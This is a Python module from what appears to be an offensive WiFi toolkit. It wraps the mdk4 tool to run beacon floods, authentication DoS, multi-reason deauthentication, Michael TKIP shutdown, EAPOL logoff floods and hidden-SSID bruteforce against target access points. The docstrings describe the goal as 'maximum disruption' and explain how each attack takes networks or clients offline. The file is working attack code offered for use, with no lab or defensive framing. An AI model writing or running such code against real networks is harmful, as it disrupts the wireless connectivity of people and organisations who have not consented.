"""
MDK4 Integration
────────────────
Advanced WiFi disruption attacks via mdk4:
  - Beacon flood (create hundreds of fake APs)
  - Authentication DoS (flood AP with auth requests)
  - Deauthentication (aggressive, multi-reason)
  - SSID probing/bruteforce
  - Michael (TKIP MIC failure) attack
  - EAPOL logoff flood

mdk4 is more aggressive than aireplay-ng and uses multiple
techniques simultaneously for maximum disruption.
"""

import os
import signal
import subprocess
import tempfile
import time
from typing import Optional, List

from posframework.config import log
from posframework.tools import is_available, which, run_tool


class MDK4:
    """
    MDK4 attack wrapper for advanced WiFi disruption.

    Usage:
        mdk = MDK4("wlan0mon")
        mdk.beacon_flood(count=200)      # 200 fake APs
        mdk.auth_dos("AA:BB:CC:DD:EE:FF")  # Auth flood specific AP
        mdk.deauth("AA:BB:CC:DD:EE:FF")    # Aggressive deauth
        mdk.stop()
    """

    def __init__(self, interface: str):
        if not is_available("mdk4"):
            raise FileNotFoundError(
                "mdk4 not installed. Install: apt-get install mdk4"
            )
        self.interface = interface
        self._proc: Optional[subprocess.Popen] = None
        self._mode: Optional[str] = None

    @property
    def running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def beacon_flood(
        self,
        ssid_list: Optional[List[str]] = None,
        ssid_file: Optional[str] = None,
        count: int = 100,
        channel: Optional[int] = None,
        wpa2: bool = False,
        speed: int = 50,
    ) -> bool:
        """
        Beacon flood — create fake APs to confuse clients and scanners.

        Args:
            ssid_list: List of SSIDs to broadcast (generates random if None).
            ssid_file: File with one SSID per line (alternative to ssid_list).
            count: Number of fake APs to create.
            channel: Lock to specific channel (None = hop).
            wpa2: Advertise fake APs as WPA2 (makes them look legit).
            speed: Packets per second (higher = more aggressive).

        Returns:
            True if started successfully.
        """
        self.stop()

        args = [self.interface, "b"]  # 'b' = beacon flood mode

        # Create temp SSID file if list provided
        tmp_file = None
        if ssid_list:
            tmp_file = tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False
            )
            for ssid in ssid_list[:count]:
                tmp_file.write(ssid + "\n")
            tmp_file.close()
            args.extend(["-f", tmp_file.name])
        elif ssid_file and os.path.isfile(ssid_file):
            args.extend(["-f", ssid_file])
        else:
            # Random SSIDs
            args.extend(["-n", str(count)])

        if channel:
            args.extend(["-c", str(channel)])
        if wpa2:
            args.append("-w")
        args.extend(["-s", str(speed)])

        return self._start_process(args, "beacon_flood")

    def auth_dos(
        self,
        bssid: str,
        mode: str = "intelligent",
        speed: int = 0,
    ) -> bool:
        """
        Authentication DoS — flood AP with auth requests until it crashes or
        stops accepting new clients.

        Args:
            bssid: Target AP BSSID.
            mode: 'intelligent' (adapts to AP responses) or 'flood' (raw speed).
            speed: Packets per second (0 = max speed).

        Returns:
            True if started successfully.
        """
        self.stop()

        args = [self.interface, "a"]  # 'a' = auth DoS mode
        args.extend(["-a", bssid])

        if mode == "intelligent":
            args.append("-i")  # Intelligent mode
        if speed > 0:
            args.extend(["-s", str(speed)])

        return self._start_process(args, "auth_dos")

    def deauth(
        self,
        bssid: Optional[str] = None,
        client: Optional[str] = None,
        target_file: Optional[str] = None,
        channel: Optional[int] = None,
    ) -> bool:
        """
        Aggressive deauthentication using mdk4.

        Sends deauth with multiple reason codes simultaneously and uses
        both deauth and disassoc frames. More aggressive than aireplay-ng.

        Args:
            bssid: Target AP BSSID (None = all APs on channel).
            client: Target specific client (None = all clients).
            target_file: File with target BSSIDs (one per line).
            channel: Lock to channel.

        Returns:
            True if started successfully.
        """
        self.stop()

        args = [self.interface, "d"]  # 'd' = deauth mode

        if target_file and os.path.isfile(target_file):
            args.extend(["-b", target_file])
        elif bssid:
            # Create temp file with single BSSID
            tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            tmp.write(bssid + "\n")
            tmp.close()
            args.extend(["-b", tmp.name])

        if client:
            # Target specific client
            tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            tmp.write(client + "\n")
            tmp.close()
            args.extend(["-s", tmp.name])

        if channel:
            args.extend(["-c", str(channel)])

        return self._start_process(args, "deauth")

    def michael_shutdown(self, bssid: str) -> bool:
        """
        Michael (TKIP) shutdown attack.

        Exploits the TKIP MIC failure countermeasure: after 2 MIC failures
        within 60 seconds, the AP shuts down for 60 seconds. This effectively
        DoS's any TKIP network.

        Only works against WPA-TKIP (not CCMP/AES) networks.

        Args:
            bssid: Target AP BSSID (must be TKIP).

        Returns:
            True if started.
        """
        self.stop()

        args = [self.interface, "m"]  # 'm' = Michael attack
        args.extend(["-t", bssid])

        return self._start_process(args, "michael")

    def eapol_logoff(self, bssid: str) -> bool:
        """
        EAPOL Logoff flood — sends fake EAPOL-Logoff frames to disconnect
        authenticated clients from WPA-Enterprise networks.

        Args:
            bssid: Target AP BSSID.

        Returns:
            True if started.
        """
        self.stop()

        args = [self.interface, "e"]  # 'e' = EAPOL mode
        args.extend(["-t", bssid])

        return self._start_process(args, "eapol_logoff")

    def ssid_probe(
        self,
        ssid_file: Optional[str] = None,
        bssid: Optional[str] = None,
    ) -> bool:
        """
        SSID probing/bruteforce — discover hidden SSIDs by probing.

        Args:
            ssid_file: Wordlist of SSIDs to try.
            bssid: Target AP BSSID (for directed probing).

        Returns:
            True if started.
        """
        self.stop()

        args = [self.interface, "p"]  # 'p' = probe mode

        if ssid_file and os.path.isfile(ssid_file):
            args.extend(["-f", ssid_file])
        if bssid:
            args.extend(["-t", bssid])

        return self._start_process(args, "ssid_probe")

    def _start_process(self, args: List[str], mode: str) -> bool:
        """Start mdk4 as a background process."""
        path = which("mdk4")
        if not path:
            return False

        cmd = [path] + args
        log.info(f"mdk4 [{mode}]: {' '.join(cmd)}")

        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            self._mode = mode
            # Give it a moment to start
            time.sleep(0.5)
            if self._proc.poll() is not None:
                # Process died immediately
                stderr = self._proc.stderr.read().decode(errors="ignore")
                log.error(f"mdk4 failed to start: {stderr}")
                self._proc = None
                return False
            return True
        except Exception as e:
            log.error(f"mdk4 start error: {e}")
            return False

    def stop(self):
        """Stop any running mdk4 process."""
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()
                self._proc.wait(timeout=2)
            except OSError:
                pass
            self._proc = None
            self._mode = None

    def __del__(self):
        self.stop()
